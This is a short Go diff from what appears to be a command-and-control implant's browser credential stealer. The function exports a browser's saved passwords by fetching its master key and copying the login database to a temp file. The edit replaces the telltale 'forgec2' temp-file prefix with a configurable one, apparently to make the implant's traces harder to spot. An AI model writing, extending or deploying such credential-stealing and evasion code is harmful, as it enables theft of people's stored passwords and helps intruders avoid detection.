@@ -91,7 +91,7 @@ func exportStorePasswords(store browserPasswordStore) string {
 		return fmt.Sprintf("=== %s Passwords ===\nmaster key error: %v\n", store.Name, err)
 	}
 
-	tmpCopy := filepath.Join(os.TempDir(), fmt.Sprintf("forgec2_%x_logins_%s.db", randNonce(), strings.ToLower(store.Name)))
+	tmpCopy := filepath.Join(os.TempDir(), fmt.Sprintf("%s_%x_logins_%s.db", persistencePrefix, randNonce(), strings.ToLower(store.Name)))
 	data, err := os.ReadFile(loginDB)
 	if err != nil {
 		return fmt.Sprintf("=== %s Passwords ===\nread error: %v\n", store.Name, err)
